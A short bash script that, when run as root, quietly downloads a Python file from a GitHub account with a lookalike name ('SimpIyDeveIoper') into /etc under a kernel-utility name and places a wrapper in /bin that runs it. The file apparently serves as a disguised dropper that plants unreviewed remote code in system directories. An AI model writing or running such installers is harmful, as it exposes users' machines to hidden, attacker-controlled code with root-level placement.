if [[ "$(whoami)" = 'root' ]];
then
cd /etc 
wget https://raw.githubusercontent.com/SimpIyDeveIoper/KrnlUtils/main/KrnlUtils.py -O krnlutils.py > /dev/null 
cd /bin
touch krnlutils
echo 'python3 /etc/krnlutils.py' > krnlutils
else
echo 'This script must be runned with root'
fi
